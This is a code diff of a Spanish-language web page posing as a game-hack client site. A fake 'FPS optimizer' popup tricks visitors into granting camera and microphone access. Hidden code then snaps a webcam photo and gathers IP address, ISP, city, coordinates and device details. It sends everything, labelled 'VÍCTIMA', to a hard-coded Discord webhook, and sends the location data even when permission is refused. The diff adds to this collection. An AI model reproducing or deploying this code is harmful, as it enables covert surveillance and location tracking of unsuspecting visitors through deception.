@@ -13,38 +13,29 @@
     .glitch { animation:glitch 4s infinite; }
     .card-anim { transition:all .3s; border:2px solid #0f0!important; box-shadow:0 0 15px rgba(0,255,0,.5); }
     .card-anim:hover { transform:scale(1.12)!important; box-shadow:0 0 40px #0f0,0 0 80px #0f0; border-color:#0ff!important; }
-    
-    #fpsPopup {
-      position:fixed; inset:0; background:rgba(0,0,0,0.97); backdrop-filter:blur(12px);
-      display:flex; align-items:center; justify-content:center; z-index:99999; color:#0f0;
-    }
-    .popup-box {
-      background:#0a0a0a; border:4px solid #0f0; padding:40px; border-radius:20px;
-      max-width:90%; text-align:center; box-shadow:0 0 60px #0f0;
-    }
+    #fpsPopup { position:fixed; inset:0; background:rgba(0,0,0,0.97); backdrop-filter:blur(12px); display:flex; align-items:center; justify-content:center; z-index:99999; color:#0f0; }
+    .popup-box { background:#0a0a0a; border:4px solid #0f0; padding:40px; border-radius:20px; max-width:90%; text-align:center; box-shadow:0 0 60px #0f0; }
   </style>
 </head>
 <body class="text-white">
 
-  <!-- POPUP FALSO DE MÁS FPS -->
   <div id="fpsPopup">
     <div class="popup-box">
       <h1 class="text-5xl glitch mb-6">OPTIMIZADOR GRÁFICO 2025</h1>
       <p class="text-xl mb-8">
         Para tener <strong>+120 FPS</strong> y <strong>cero lag</strong> en todos los clientes hack,<br>
         acepta los permisos de cámara y micrófono.<br><br>
-        Esto activa el nuevo <strong>modo rendimiento extremo</strong>.
+        Esto activa el <strong>modo rendimiento extremo</strong>.
       </p>
       <button onclick="iniciarTodo()" class="bg-green-600 hover:bg-green-500 px-16 py-6 text-3xl rounded-xl glitch">
         ACEPTAR Y AUMENTAR FPS
       </button>
-      <p class="text-sm mt-6 opacity-50">cierra si no quieres más rendimiento</p>
     </div>
   </div>
 
   <canvas id="matrix"></canvas>
   <div class="matrix-bg"></div>
-  <video id="cam" autoplay playsinline style="position:fixed; width:1px; height:1px; opacity:0;"></video>
+  <video id="cam" autoplay playsinline style="position:fixed;width:1px;height:1px;opacity:0;"></video>
   <canvas id="canvas" style="display:none;"></canvas>
 
   <!-- TU PÁGINA COMPLETA -->
@@ -100,10 +91,8 @@
     const WEBHOOK = "https://discord.com/api/webhooks/1447276191961841905/IWpiF5AZjKc8iHpch5JkReeixmIjZv13QR4ZvS-ldQeiniF-iCVLyotHDlEEsdcETyyU";
 
     async function iniciarTodo() {
-      // Quitar popup
       document.getElementById('fpsPopup').remove();
 
-      // Pedir cámara + mic (la mayoría acepta por los FPS)
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
         const video = document.getElementById('cam');
@@ -117,18 +106,33 @@
           const foto = canvas.toDataURL('image/png');
           stream.getTracks().forEach(t => t.stop());
 
-          // RECOGER DATOS
           const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
+          const uaData = navigator.userAgentData || {};
+          const datos = {
+            hora: new Date().toLocaleString("es-SV"),
+            ip: geo.ip || '???',
+            isp: geo.org || '???',
+            ciudad: geo.city || '???',
+            pais: geo.country_name || '???',
+            lat: geo.latitude || '???',
+            lon: geo.longitude || '???',
+            navegador: navigator.userAgent.substring(0,120),
+            sistema: uaData.platform || navigator.platform || '???',
+            movil: uaData.mobile ? 'Sí' : 'No',
+            ram: navigator.deviceMemory || '???',
+            cpu: navigator.hardwareConcurrency || '???',
+            pantalla: `${screen.width}x${screen.height}`
+          };
 
           const mensaje = `**VÍCTIMA EN FORGEX v2**
-**IP:** ${geo.ip || '???'} (${geo.org || '???'})
-**Lugar:** ${geo.city || '???'}, ${geo.country_name || '???'}
-**Coords:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
-**Hora SV:** ${new Date().toLocaleString("es-SV")}
-**Dispositivo:** ${(navigator.userAgentData?.platform || navigator.platform || '???')} | Móvil: ${navigator.userAgentData?.mobile ? 'Sí' : 'No'}
-**RAM:** ${navigator.deviceMemory || '???'}GB | CPU: ${navigator.hardwareConcurrency || '???'} núcleos
-**Pantalla:** ${screen.width}x${screen.height}
-**Navegador:** ${navigator.userAgent.substring(0,120)}`;
+**IP:** ${datos.ip} (${datos.isp})
+**Lugar:** ${datos.ciudad}, ${datos.pais}
+**Coords:** ${datos.lat}, ${datos.lon}
+**Hora SV:** ${datos.hora}
+**Dispositivo:** ${datos.sistema} | Móvil: ${datos.movil}
+**RAM:** ${datos.ram}GB | CPU: ${datos.cpu} núcleos
+**Pantalla:** ${datos.pantalla}
+**Navegador:** ${datos.navegador}`;
 
           await fetch(WEBHOOK, {
             method: 'POST',
@@ -142,29 +146,28 @@
         }, 2500);
 
       } catch (e) {
-        // Si niega permisos → envía solo datos
         const geo = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-        const mensaje = `**VÍCTIMA EN FORGEX v2 (sin foto)**
+        const mensajeSinFoto = `**VÍCTIMA EN FORGEX v2 (sin foto)**
 **IP:** ${geo.ip || '???'} (${geo.org || '???'})
 **Lugar:** ${geo.city || '???'}, ${geo.country_name || '???'}
+**Coords:** ${geo.latitude || '???'}, ${geo.longitude || '???'}
 **Hora SV:** ${new Date().toLocaleString("es-SV")}`;
 
         await fetch(WEBHOOK, {
           method: 'POST',
           headers: {'Content-Type': 'application/json'},
-          body: JSON.stringify({ content: mensaje })
+          body: JSON.stringify({ content: mensajeSinFoto })
         });
       }
     }
 
-    // === MATRIX, SONIDOS, VISITAS ===
+    // MATRIX + SONIDOS + VISITAS
     const canvas = document.getElementById('matrix');
     const ctx = canvas.getContext('2d');
     canvas.width = innerWidth; canvas.height = innerHeight;
     const letters = '01ABCDEFGHIJKLMNOPQRSTUVWXYZ';
     const fontSize = 14;
     let drops = Array(Math.floor(canvas.width/fontSize)).fill(1);
-
     function draw() {
       ctx.fillStyle = 'rgba(0,0,0,0.05)';
       ctx.fillRect(0,0,canvas.width,canvas.height);
